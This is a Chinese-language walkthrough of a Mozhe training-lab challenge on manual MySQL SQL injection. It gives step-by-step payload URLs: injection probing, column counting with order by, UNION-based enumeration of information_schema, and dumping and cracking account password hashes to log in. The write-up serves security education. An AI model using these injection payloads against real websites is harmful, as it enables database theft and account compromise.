# SQL手工注入漏洞测试(MySQL数据库)

+++

## 原题地址

<https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe>



#### 背景介绍                                

安全工程师"墨者"最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。



## 题解

首先打开靶场环境，在登录框尝试输入sql语句，发现并没有什么用，突然发现登录框下有滚动通知框

![img](file:///C:\Users\Yee\AppData\Roaming\Tencent\Users\1679880584\QQ\WinTemp\RichOle\7XENSHC~J%NR3DT84BZH35R.png)

点进去又是一个页面：

![image-20200802224529301](C:\Users\Yee\AppData\Roaming\Typora\typora-user-images\image-20200802224529301.png)

### 第一步：

通过修改参数找到切入点

~~~
http://219.153.49.228:47744/new_list.php?id=1

(1) //后面加单引号'页面出现异常
http://219.153.49.228:47744/new_list.php?id=1'

(2)//后面加and 1=1 页面正常，后面加 and 1=2 页面异常
http://219.153.49.228:47744/new_list.php?id=1 and 1=1

http://219.153.49.228:47744/new_list.php?id=1 and 1=2

(3)//修改参数值，1改为0，页面异常
http://219.153.49.228:47744/new_list.php?id=0


注意 ：
上面三种方法中的任意一种得到的结果都只能说明此处可能存在注入点，而不是一定存在注入点！！！！！！！

## 第一种加单引号'：即使页面出现异常，这并不代表这个地方一定存在注入点。
   为什么不能一定，打个比方：
   编程人员检测到了你的单引号或者其他非法字符，给你跳转了页面（页面跳转与原页面确实不同，也算页面异常），这就不代表你是注入	      了，而是编程人员有意防范了。
##  第二种and 1=1 和 and 1=2 and 1=1 这样的检测方法可能就网页不做任何过滤或者限制的时候能稍微判断下

## 第三种是参数值可控


~~~

> 很有必要深刻理解下sql注入
>
> + SQL注入：攻击者通过构造不同的**SQL语句**来**实现对数据库的操作（即与数据库产生交互）**；
>
>   通过概念我们应该得到：***判断注入至少得执行一条sql语句才算有注入***，**你得保证能执行类似select ,version等等之类的命令才算是存在注入点**，那些加了单引号，运用了and 1=1/1=2 使页面产生异常的都不能算一定存在注入点，这个只是可能存在注入，只有当执行了sql语句才算有注入。所以我们还需继续往下判断。这个时候需要<u>判断出字段数</u>，<u>找回显点</u>（这个时候联合了union加了条select语句），如果有回显，此时就能确定是存在sql注入（因为有回显就说明执行了union后的select语句，即执行了一条sql语句）。找到回显点后，我们就应该继续去找库名，表名，列名，最后得到用户名，密码等我们想到的东西。
>
> + 注意:
>
>   + 判断字段数时，我们有两种方法：一种是利用order by语句，虽然利用他的过程中会有页面前后异常的情况出现，但单单通过order by使页面异常就得出存在注入点是不正确的，因为order by不是一条完整的sql语句。
>
>     第二种方法是利用union语句在后面加select 1,(2,3,4....)来判断，这种方法也有页面异常的情况出现，但这种异常是语法错误导致的，因为union语句前后的字段数必须完全相等，当前面字段数为4，后面union select 1一定会报错（因为后面字段数为1，与前面4不相等）
>
>   + 在判断回显点时，如果页面没有出现回显，就不能确定就是否一定存在注入，所以此时可以考虑下盲注，然后可以通过基于时间的盲注或者布尔的盲注来判断是不是存在注入。



### 第二步：

使用 order by 排序 确定当前操作的数据库表中的字段数

~~~
http://219.153.49.228:47744/new_list.php?id=1 order by 1  //页面正常
http://219.153.49.228:47744/new_list.php?id=1 order by 2  //页面正常
http://219.153.49.228:47744/new_list.php?id=1 order by 3  //页面正常
http://219.153.49.228:47744/new_list.php?id=1 order by 4  //页面正常
http://219.153.49.228:47744/new_list.php?id=1 order by 5  //页面异常

所以得出字段数为4
~~~

### 第三步：

通过<u>***让页面出错 加上联合查询的方式***</u>寻找回显点

~~~
http://219.153.49.228:47744/new_list.php?id=0 union select 1,2,3,4
//让id=0是为了让页面出错
//页面出现了2，3，说明第二，三字段处是回显点
~~~

![img](file:///C:\Users\Yee\Documents\Tencent Files\1679880584\Image\C2C\Image2\ZWAH@3Y%T{OMVNO66_8}[34.png)

### 第四步：

利用回显点查看数据库版本和数据库名

~~~
http://219.153.49.228:47744/new_list.php?id=0 union select 1,version(),database(),4

//发现版本在5.0之上，所以有information_schema数据库
~~~

![image-20200802235227991](C:\Users\Yee\AppData\Roaming\Typora\typora-user-images\image-20200802235227991.png)

### 第五步：

查看表名

~~~
http://219.153.49.228:47744/new_list.php?id=0 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'

//获取表名StormGroup_member和notice
~~~

![image-20200802235633251](C:\Users\Yee\AppData\Roaming\Typora\typora-user-images\image-20200802235633251.png)

### 第六步：

查看字段名

~~~
http://219.153.49.228:47744/new_list.php?id=0 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='StormGroup_member' 

//获取字段名id,name,password,status
~~~

![image-20200802235859661](C:\Users\Yee\AppData\Roaming\Typora\typora-user-images\image-20200802235859661.png)



### 第七步：

查询账号和密码

~~~
http://219.153.49.228:47744/new_list.php?id=0 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member

//获取登录用户名及密码

mozhe ，356f589a7df439f6f744ff19bb8092c0

mozhe ，72a23003e129f68e665c3ccb796cab84

注意：mozhe 是账号，一共两个密码，只有一个是真的。
~~~

![image-20200803000254601](C:\Users\Yee\AppData\Roaming\Typora\typora-user-images\image-20200803000254601.png)

### 第八步：

百度使用MD5解密，获得密码。

![image-20200803000630792](C:\Users\Yee\AppData\Roaming\Typora\typora-user-images\image-20200803000630792.png)

![image-20200803000642005](C:\Users\Yee\AppData\Roaming\Typora\typora-user-images\image-20200803000642005.png)



### 第九步：

登录账号密码，进入后下方很显眼的位置获得KEY。

![img](file:///C:\Users\Yee\Documents\Tencent Files\1679880584\Image\C2C\Image2\_BO934~B}{1JK[E`{5D6Q8R.png)